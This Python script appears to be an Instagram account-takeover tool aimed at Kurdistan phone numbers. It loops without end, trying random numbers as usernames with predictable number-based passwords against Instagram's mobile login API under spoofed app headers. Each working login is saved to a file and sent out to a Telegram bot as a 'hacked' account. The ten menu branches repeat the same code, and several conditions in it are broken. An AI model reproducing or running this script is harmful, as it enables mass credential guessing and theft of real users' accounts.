import os
from time import sleep
import webbrowser
webbrowser.open('https://t.me/itsmepalabun')
os.system("title " + " #@I4m_palabun")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
def banner():
   sleep(1)
   print("""\t\x1b[1;92m
____       _       _
|  _ \ __ _| | __ _| |__  _   _ _ __
| |_) / _` | |/ _` | '_ \| | | | '_ \
|  __/ (_| | | (_| | |_) | |_| | | | |
|_|   \__,_|_|\__,_|_.__/ \__,_|_| |_|


 """)
 
print(banner)
webbrowser.open('https://t.me/python453')
def close():
    input('- Press Enter To Exit /')
    sys.exit()
h , b,s,block = 0,0,0,0
tele = 'y' or 'Y'
if "Y" in tele:
    id = input("[+] Id Tele : ")
    print('')
    bot = input("[+] Token Bot : ")
elif "y" in tele:
    id = input("[+] Id Tele : ")
    print('')
    bot = input("[+] Token Bot  : ")
    print()
   
print("==========================")
ask = input("""[1] Raqami Kurdstan 0750
[2] Raqami Kurdstan 0751
[3] Raqami Kurdstan 0770
[4] Raqami Kurdstan 0771
[5] Raqami Kurdstan 0772
[6] Raqami Kurdstan 0773
[7] Raqami Kurdstan 0780
[8] Raqami Kurdstan 0781
[9] Raqami Kurdstan 0782
[10] Raqami Kurdstan 0783
==========================

    
[+] Halbzhira  : """)
if ask == "1":
   
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964750' + us
        pasw = '0750' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="2":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964751' + us
        pasw = '0751' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="3":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964770' + us
        pasw = '0770' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="4":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964771' + us
        pasw = '0771' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀ : {user} \n[=] Pᴀѕѕ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="5":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964772' + us
        pasw = '0772' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="6":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964773' + us
        pasw = '0773' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="7":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964780' + us
        pasw = '0780' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="8":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964781' + us
        pasw = '0781' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="9":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964782' + us
        pasw = '0782' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
elif ask =="10":
  
    make = '3092817456'
    clear()
    banner()
    print("")
    print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964783' + us
        pasw = '0783' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.2)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n𝙱𝚈 : @I4m_palabun")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
        else:
            b+=1    
            print(f"\r             Hacked : {h} ✅  $$$  Acc : {b} 🚫 ",end='')
